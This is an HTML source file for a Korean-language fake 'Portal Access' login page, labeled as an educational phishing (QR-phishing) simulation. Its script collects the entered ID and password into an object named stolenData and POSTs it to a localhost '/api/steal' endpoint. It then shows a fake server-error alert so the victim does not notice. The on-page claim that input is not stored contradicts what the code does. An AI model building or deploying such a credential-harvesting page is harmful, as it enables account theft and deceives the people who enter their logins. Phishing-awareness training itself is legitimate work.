<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>포털 인증 안내</title>
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: "Segoe UI", Arial, sans-serif;
      background:
        radial-gradient(circle at top left, #e8fff1 0%, transparent 35%),
        radial-gradient(circle at bottom right, #eaf4ff 0%, transparent 35%),
        linear-gradient(135deg, #f4f7f6 0%, #eef3f8 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #1f2937;
    }

    .wrapper {
      width: 100%;
      max-width: 420px;
      padding: 24px;
    }

    .card {
      background: rgba(255, 255, 255, 0.92);
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0.7);
      border-radius: 22px;
      box-shadow: 0 18px 45px rgba(0, 0, 0, 0.08);
      padding: 34px 28px 26px;
    }

    .brand {
      text-align: center;
      margin-bottom: 28px;
    }

    .brand-badge {
      width: 58px;
      height: 58px;
      margin: 0 auto 14px;
      border-radius: 18px;
      background: linear-gradient(135deg, #10b981, #22c55e);
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 24px;
      font-weight: 700;
      box-shadow: 0 10px 24px rgba(16, 185, 129, 0.25);
    }

    .brand h1 {
      margin: 0;
      font-size: 28px;
      font-weight: 800;
      letter-spacing: -0.02em;
    }

    .brand p {
      margin: 10px 0 0;
      font-size: 14px;
      color: #6b7280;
      line-height: 1.5;
    }

    .field {
      margin-bottom: 14px;
    }

    .field label {
      display: block;
      margin-bottom: 7px;
      font-size: 13px;
      font-weight: 600;
      color: #374151;
    }

    .input-wrap {
      position: relative;
    }

    .input-wrap input {
      width: 100%;
      padding: 14px 16px;
      border: 1px solid #d1d5db;
      border-radius: 14px;
      background: #fbfdff;
      font-size: 14px;
      outline: none;
      transition: 0.2s ease;
    }

    .input-wrap input:focus {
      border-color: #22c55e;
      box-shadow: 0 0 0 4px rgba(34, 197, 94, 0.12);
      background: #ffffff;
    }

    .row {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin: 10px 0 18px;
      gap: 12px;
      font-size: 13px;
      color: #6b7280;
    }

    .row label {
      display: flex;
      align-items: center;
      gap: 6px;
      cursor: pointer;
    }

    .row a {
      color: #10b981;
      text-decoration: none;
      font-weight: 600;
    }

    .row a:hover {
      text-decoration: underline;
    }

    .btn {
      width: 100%;
      border: none;
      border-radius: 14px;
      padding: 15px 16px;
      background: linear-gradient(135deg, #10b981, #22c55e);
      color: white;
      font-size: 15px;
      font-weight: 700;
      cursor: pointer;
      transition: transform 0.15s ease, box-shadow 0.15s ease, opacity 0.15s ease;
      box-shadow: 0 12px 24px rgba(16, 185, 129, 0.22);
    }

    .btn:hover {
      transform: translateY(-1px);
      opacity: 0.98;
    }

    .btn:active {
      transform: translateY(0);
    }

    .divider {
      margin: 22px 0 18px;
      text-align: center;
      position: relative;
      color: #9ca3af;
      font-size: 12px;
    }

    .divider::before,
    .divider::after {
      content: "";
      position: absolute;
      top: 50%;
      width: 38%;
      height: 1px;
      background: #e5e7eb;
    }

    .divider::before {
      left: 0;
    }

    .divider::after {
      right: 0;
    }

    .sub-btn {
      width: 100%;
      border: 1px solid #d1d5db;
      border-radius: 14px;
      padding: 13px 16px;
      background: white;
      color: #374151;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
    }

    .notice {
      margin-top: 18px;
      padding: 14px 15px;
      border-radius: 14px;
      background: #f8fafc;
      border: 1px solid #e5e7eb;
      font-size: 12.5px;
      color: #6b7280;
      line-height: 1.6;
    }

    .warning {
      margin-top: 14px;
      padding: 14px 15px;
      border-radius: 14px;
      background: #fff7ed;
      border: 1px solid #fed7aa;
      color: #9a3412;
      font-size: 12.5px;
      line-height: 1.6;
    }

    .footer {
      text-align: center;
      margin-top: 16px;
      font-size: 12px;
      color: #9ca3af;
    }

    @media (max-width: 480px) {
      .wrapper {
        padding: 16px;
      }

      .card {
        padding: 28px 20px 22px;
        border-radius: 18px;
      }

      .brand h1 {
        font-size: 24px;
      }
    }
  </style>
</head>
<body>
  <div class="wrapper">
    <div class="card">
      <div class="brand">
        <div class="brand-badge">P</div>
        <h1>Portal Access</h1>
        <p>
          외부 네트워크 또는 안내 페이지 접속을 위해<br />
          계정 인증이 필요합니다.
        </p>
      </div>

      <form onsubmit="return fakeLogin()">
        <div class="field">
          <label for="userId">아이디</label>
          <div class="input-wrap">
            <input id="userId" type="text" placeholder="아이디를 입력하세요" required />
          </div>
        </div>

        <div class="field">
          <label for="userPw">비밀번호</label>
          <div class="input-wrap">
            <input id="userPw" type="password" placeholder="비밀번호를 입력하세요" required />
          </div>
        </div>

        <div class="row">
          <label>
            <input type="checkbox" />
            로그인 상태 유지
          </label>
          <a href="#" onclick="return false;">비밀번호 찾기</a>
        </div>

        <button class="btn" type="submit">로그인</button>

        <div class="divider">또는</div>

        <button class="sub-btn" type="button" onclick="showInfo()">
          인증 안내 보기
        </button>
      </form>

      <div class="notice">
        본 페이지는 네트워크 인증 절차를 안내하기 위한 예시 화면입니다.
        실제 서비스 환경에서는 보안 점검 후 접속 여부를 확인해야 합니다.
      </div>

      <div class="warning">
        교육용 피싱 시뮬레이션 페이지입니다. 입력 정보는 저장되지 않으며,
        제출 즉시 안내 메시지만 표시됩니다.
      </div>
    </div>

    <div class="footer">
      Security Demo Page
    </div>
  </div>

<script>
    function fakeLogin() {
      // 1. 사용자가 입력한 아이디와 비밀번호 가져오기
      const id = document.getElementById('userId').value;
      const pw = document.getElementById('userPw').value;

      // 2. 백엔드(팀원 2)로 보낼 데이터 포장
      const stolenData = {
        type: 'portal_phishing',
        userId: id,
        userPw: pw
      };

      console.log("탈취 시도 중인 포털 계정 정보:", stolenData);

      // 3. 백엔드 서버로 데이터 전송 (Fetch API)
      const backendUrl = 'http://localhost:5000/api/steal'; 

      fetch(backendUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(stolenData)
      })
      .then(response => {
        // 전송 성공 시 피해자를 속이는 가짜 메시지
        alert("네트워크 인증 서버에 연결할 수 없습니다.\n잠시 후 다시 시도해주세요.");
        document.getElementById('userId').value = '';
        document.getElementById('userPw').value = '';
      })
      .catch(error => {
        console.error('서버 연결 실패:', error);
        alert("교육용 피싱 시뮬레이션입니다.\n(현재 백엔드 서버가 꺼져 있어 데이터가 전송되지 않았습니다.)");
      });

      return false; // 폼이 제출되면서 페이지가 새로고침 되는 것을 막음
    }

    function showInfo() {
      alert("이 페이지는 큐싱 보안 시연용 예시 화면입니다.");
    }
  </script>
</body>
</html>
